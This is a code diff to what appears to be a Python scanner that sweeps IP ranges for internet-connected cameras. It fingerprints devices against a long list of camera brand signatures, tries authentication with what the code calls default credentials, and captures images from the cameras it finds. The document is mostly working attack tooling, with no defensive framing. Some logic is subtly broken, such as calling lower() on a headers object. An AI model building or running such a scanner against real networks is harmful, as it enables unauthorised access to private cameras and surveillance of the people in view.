@@ -99,42 +99,118 @@ DEFAULT_CREDS = [
 ]
 
 CAMERA_SIGS = [
-    'webcam', 'ipcam', 'netcam', 'camera', 'hikvision', 'dahua', 'axis', 'sony', 'panasonic', 
-    'mobotix', 'geovision', 'vivotek', 'trendnet', 'arecont', 'bosch', 'canon', 'samsung', 
-    'hanwha', 'pelco', 'avigilon', 'uniview', 'tiandy', 'watchnet', 'acti', 'infinova', 'onvif',
-    'rtsp', 'foscam', 'amcrest', 'reolink', 'wyze', 'arlo', 'nest', 'ring', 'ubiquiti', 'unifi',
-    'lorex', 'swann', 'flir', 'annke', 'zosi', 'honeywell', 'tplink', 'dlink', 'cisco', 'yoosee',
-    'vstarcam', 'wanscam', 'milesight', 'sunba', 'microseven', 'gw security', 'laview', 'anran',
-    'zxtech', 'hawk eye', 'defender', 'night owl', 'ezviz', 'floureon', 'sricam', 'besder', 'iegeek',
-    'ctronics', 'gadinan', 'hiseeu', 'defeway', 'jooan', 'kerui', 'phylink', 'smonet', 'jennov',
-    'hosafe', 'anspo', 'hjt', 'jidetech', 'loosafe', 'ssicon', 'xvim', 'yeskamo', 'zivif'
+    'ipcamera',
+    'netcam',
+    'webcam',
+    'web camera',
+    'ip camera',
+    'network camera',
+    'onvif',
+    'rtsp',
+    'hikvision',
+    'dahua',
+    'axis',
+    'foscam',
+    'amcrest',
+    'reolink',
+    'ubiquiti',
+    'lorex',
+    'swann',
+    'hanwha',
+    'vivotek',
+    'bosch',
+    'panasonic',
+    'trendnet',
+    'dlink',
+    'geovision',
+    'avigilon',
+    'mobotix',
+    'arecont',
+    'acti',
+    'samsung',
+    'toshiba',
+    'uniview',
+    'pelco',
+    'honeywell',
+    'flir',
+    'basler',
+    'zavio',
+    'grandstream',
+    'milesight',
+    'provision-isr',
+    'watchnet',
+    'digital watchdog',
+    'microseven',
+    'annke',
+    'zosi',
+    'zmodo',
+    'ivideon',
+    'wyze',
+    'tapo',
+    'eufy',
+    'arlo',
+    'nest cam',
+    'blink',
+    'ring camera',
+    'unifi protect',
+    'yoosee',
+    'vstarcam',
+    'wansview',
+    'sricam',
+    'floureon',
+    'video server',
+    'network video',
+    'nvr',
+    'dvr',
+    'ipcam',
+    'netcam',
+    'webcamxp',
+    'webcam 7',
+    'blue iris',
+    'surveillance',
+    'cctv',
 ]
 
-CAMERA_PATHS = [
-    '/', '/index.html', '/home.html', '/main.html', '/live.html', '/stream.html', '/view.html',
-    '/viewer.html', '/index.htm', '/home.htm', '/main.htm', '/live.htm', '/stream.htm', '/view.htm',
-    '/viewer.htm', '/app.html', '/login.html', '/login.htm', '/mobile.html', '/mobile.htm',
-    '/h264.html', '/mjpg.html', '/cgi-bin/viewer/video.jpg', '/snap.jpg', '/snapshot.jpg',
-    '/capture.jpg', '/image.jpg', '/pic.jpg', '/image/jpeg.cgi', '/video.cgi', '/videostream.cgi',
-    '/cgi-bin/video.cgi', '/cgi-bin/videostream.cgi', '/cgi-bin/snapshot.cgi',
-    '/cgi-bin/capture.cgi', '/cgi-bin/mjpg/video.cgi', '/cgi-bin/mjpg/videostream.cgi',
-    '/cgi-bin/mjpg/snapshot.cgi', '/cgi-bin/mjpg/capture.cgi', '/webcam.html', '/webcam.htm',
-    '/webcam.cgi', '/webcam.jpg', '/webcam/video.cgi', '/webcam/videostream.cgi',
-    '/webcam/snapshot.cgi', '/webcam/capture.cgi', '/onvif/device_service', '/onvif/media',
-    '/onvif/snapshot', '/onvif/live', '/live/stream', '/live/video', '/live/mjpeg',
-    '/live/snapshot', '/live/capture', '/video/stream', '/video/live', '/video/mjpeg',
-    '/video/snapshot', '/video/capture', '/mjpeg/stream', '/mjpeg/video', '/mjpeg/live',
-    '/mjpeg/snapshot', '/mjpeg/capture', '/stream/video', '/stream/live', '/stream/mjpeg',
-    '/stream/snapshot', '/stream/capture'
+CAMERA_HEADERS = [
+    'server',
+    'www-authenticate',
+    'x-camera-id',
+    'x-powered-by',
+    'x-frame-options',
+    'x-content-type-options',
 ]
 
-headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-    'Accept': '*/*',
-    'Accept-Language': 'en-US,en;q=0.9',
-    'Accept-Encoding': 'gzip, deflate',
-    'Connection': 'keep-alive'
-}
+def is_camera(url, r=None):
+    try:
+        if not r:
+            r = requests.get(url, timeout=2, verify=False)
+            
+        if r.status_code == 401 and 'www-authenticate' in r.headers.lower():
+            return True
+            
+        content = r.text.lower()
+        headers = str(r.headers).lower()
+        
+        for sig in CAMERA_SIGS:
+            if sig.lower() in content or sig.lower() in headers:
+                return True
+                
+        for header in CAMERA_HEADERS:
+            if header.lower() in r.headers:
+                header_val = str(r.headers[header]).lower()
+                for sig in CAMERA_SIGS:
+                    if sig.lower() in header_val:
+                        return True
+                        
+        if 'rtsp://' in content or 'rtmp://' in content:
+            return True
+            
+        if any(x in content for x in ['mjpg', 'mjpeg', 'cgi-bin/video', 'videostream', 'snapshot.cgi']):
+            return True
+            
+        return False
+    except:
+        return False
 
 def capture_camera_image(url, auth=None):
     try:
@@ -298,11 +374,37 @@ def scan_network(network):
         list(executor.map(scan_ip, ips))
 
 def scan_ip(ip):
-    open_ports = quick_port_scan(ip)
-    if not open_ports:
-        return
-    with ThreadPoolExecutor(max_workers=50) as ex:
-        ex.map(lambda p: check_port(ip, p), open_ports)
+    try:
+        url = str(ip)
+        r = requests.get(f'http://{url}', timeout=TIMEOUT, verify=False)
+        
+        if not is_camera(url, r):
+            return
+            
+        save_camera(url, 'Open camera')
+        if try_auth(url):
+            return
+            
+        capture_camera_image(url)
+        
+    except requests.exceptions.RequestException:
+        try:
+            url = f'https://{ip}'
+            r = requests.get(url, timeout=TIMEOUT, verify=False)
+            
+            if not is_camera(url, r):
+                return
+                
+            save_camera(url, 'Open camera (HTTPS)')
+            if try_auth(url):
+                return
+                
+            capture_camera_image(url)
+            
+        except:
+            pass
+    except:
+        pass
 
 def quick_port_scan(ip):
     open_ports = []
